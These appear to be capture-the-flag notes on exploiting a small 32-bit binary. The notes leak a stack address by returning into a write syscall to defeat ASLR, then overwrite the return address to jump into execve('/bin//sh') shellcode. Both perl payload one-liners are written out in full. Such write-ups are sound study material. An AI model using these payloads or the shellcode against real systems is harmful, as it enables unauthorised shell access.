Craft an input where shellcode is placed after the return address

Exploit Mitigations: ASLR

Because of ASLR, the stack is located at random location. Therefore we must leak an address. 
Having the program return back to write syscall (0x08048087) will mean the binary will call the 
write syscall with the following args. We can do this because the binary has no PIE the address 
of the .text section will be fixed.
  eax = 4    syscall number
  ebx = 1    stdout
  ecx = esp  buf is top of stack
  edx = 20   bytes size

This leaks 20 bytes off the top of the stack - use this to bypass ASLR
The first 4 bytes is the saved stack pointer (first instr). It points to the 4th byte of input 
buffer on the second read input. Shellcode will be placed at the end thus starts at 28th byte.
  shellcode_addr = leaked_stack_ptr + 20 (ret removes 4 bytes)

1. input leaks 20 bytes off stack - redirects control flow back to write system call
  perl -e 'print "A"x20 . "\x87\x80\x04\x08"'

2. input redirects control flow to shellcode 
  shellcode_addr = leaked_stack_ptr + 20
  perl -e 'print "A"x20 . shellcode_addr . 
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x83\xc0\x0b\xcd\x80"'

